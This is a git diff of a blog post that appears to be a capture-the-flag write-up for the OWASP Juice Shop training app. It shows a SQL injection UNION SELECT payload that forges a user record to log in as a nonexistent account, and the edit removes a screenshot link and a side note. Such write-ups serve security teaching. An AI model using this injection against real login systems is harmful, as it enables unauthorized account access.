@@ -218,11 +218,8 @@ Referring back to the Users information in the database we see that the only thi
 
 ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
 ```
-![bogus_user_success](https://github.com/jjolley91/blog/blob/main/static/bogus_user_success.png?raw=true)
 
 That's a pretty beefy query, but it gets the job done! we are now logged in as a nonexistant user!
-
->note the email address is not even important for this challenge as long as you manage to login with a non-existant user. 
 
 You can run this command directly from the login screen instead of using burp as well.
 
